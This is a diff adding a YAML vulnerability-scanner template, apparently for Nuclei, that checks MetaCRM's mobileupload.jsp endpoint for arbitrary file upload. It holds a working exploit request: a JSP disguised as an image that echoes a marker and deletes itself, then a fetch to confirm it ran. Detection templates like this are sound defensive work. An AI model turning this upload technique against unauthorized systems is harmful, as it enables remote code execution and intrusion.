@@ -1,0 +1,63 @@
+id: poc-metacrm-mobileupload-anyfile-upload
+
+info:
+  name: MetaCRM 任意文件上传漏洞检测
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    MetaCRM客户关系管理系统存在mobileupload任意文件上传漏洞，
+    攻击者可以利用该漏洞上传恶意文件，可能导致任意代码执行。
+
+variables:
+  t1: "{{rand_text_alphanumeric(7)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload
+    method: POST
+    path:
+      - "{{BaseURL}}/mobile/mobileupload.jsp"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+    body: |-
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+      Content-Type: image/jpeg
+
+      <% out.print("{{t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "userfile"
+          - ".jsp"
+    extractors:
+      - type: regex
+        name: file
+        group: 0
+        regex:
+          - "([0-9a-z]{32}).jsp"
+        internal: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/userfile/default/temp/{{file}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
